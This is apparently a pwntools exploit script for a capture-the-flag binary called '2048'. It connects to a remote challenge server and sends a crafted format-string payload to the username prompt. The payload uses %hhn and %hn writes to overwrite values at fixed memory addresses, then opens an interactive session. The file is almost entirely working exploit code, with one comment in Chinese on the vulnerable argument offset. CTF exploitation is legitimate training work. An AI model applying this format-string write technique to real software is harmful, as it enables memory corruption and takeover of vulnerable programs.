from pwn import *

# p=process("./2048")
p=remote('ctf.v50to.cc',10249)
context.log_level='debug'
# gdb.attach(p)
gameaddr=0x0000000000603160
writedata=0x603170
# 格式化字符串漏洞,%6为第一个参数
# 向gameaddr写入0x
# payload=b'96c%12$hn12538c%13$hn170c%14$hhn'.ljust(0x30,b'f')+p64(gameaddr)+p64(gameaddr+2)+p64(writedata)
payload=b'%49c%13$hhn'
payload+=b'%47c%14$hn'
payload+=b'%16c%12$hhn'
payload+=b'%155c%15$hhn'
payload=payload.ljust(0x30,b'f')
payload+=p64(gameaddr)+p64(gameaddr+1)+p64(gameaddr+2)+p64(writedata)
# payload=b'96c%12$hn'.ljust(0x30,b'f')+p64(gameaddr)
# gdb.attach(p,'b *0x0000000000401C42')
# pause()
p.recvuntil(b'Input your username to start: ')
p.sendline(payload)
# recvthing=p.recv()
# print(recvthing)
# pause()
p.interactive()